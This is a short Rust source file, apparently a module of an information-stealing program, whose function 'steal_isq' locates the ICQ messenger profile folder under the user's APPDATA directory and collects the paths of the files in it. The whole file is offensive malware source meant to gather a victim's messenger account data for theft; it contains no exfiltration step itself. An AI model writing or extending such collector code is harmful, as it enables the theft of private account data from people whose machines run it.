use walkdir::*;

pub fn steal_isq() -> Vec<String> {
    let mut paths: Vec<String> = Vec::new();
    let path_str = format!("{}\\ICQ\\0001\\", std::env::var("APPDATA").unwrap());
    let path = std::path::Path::new(&path_str);

    if !path.exists() { return Vec::new() }
    
    for entry in WalkDir::new(path).max_depth(1).into_iter().filter_map(|f| f.ok()) {
        paths.push(entry.path().to_string_lossy().to_string());
    }
    paths
}